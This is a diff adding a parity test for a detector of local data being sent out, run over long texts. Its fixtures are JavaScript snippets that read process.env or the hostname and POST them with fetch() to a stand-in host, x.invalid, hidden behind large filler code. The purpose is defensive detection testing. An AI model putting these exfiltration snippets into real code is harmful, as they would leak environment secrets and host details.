@@ -116,5 +116,29 @@ class RustSignsParityTests(unittest.TestCase):
                 self.assertTrue(any(v[k] not in quiet for v in self.want), field)
 
 
+def long_texts():
+    """Texts longer than core._LD_LONG (a bundle): a name carries the data
+    only _LD_NEAR characters from where it was given it."""
+    filler = "".join("function f%d(a) { return a + %d; }\n" % (k, k) for k in range(8000))
+    send = "fetch('https://x.invalid/', {method: 'POST', body: JSON.stringify(%s)});\n"
+    payload = "const os = require('os');\nconst data = {h: os.hostname()};\n" + send % "data"
+    return [filler + payload, payload + filler, "var data = {h: require('os').hostname()};\n" + filler + send % "data",
+            "var data = process.env;\n" + filler[:30000] + "var data = 1;\n" + send % "data" + filler,
+            "class C { constructor() { this.env = process.env; } }\n" + filler + "this.env.x;\n" + send % "this.env",
+            "var require_x = __commonJS({ \"x.js\"(exports) { var e = process.env; } });\n" + filler
+            + "var x = require_x();\n" + send % "x"]
+
+
+@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
+class LongTextFlowParityTests(unittest.TestCase):
+    def test_a_long_texts_flow_agrees(self):
+        texts = long_texts()
+        self.assertTrue(all(len(t) > core._LD_LONG for t in texts))
+        got = [r.get("ok", r) for r in _native.call("batch", {"calls": [["local_data_sent_at", {}, t] for t in texts]})]
+        want = [as_json(core.local_data_sent_at(t)) for t in texts]
+        self.assertEqual(got, want)
+        self.assertEqual([w is not None for w in want], [True, True, False, False, False, False])
+
+
 if __name__ == "__main__":
     unittest.main()
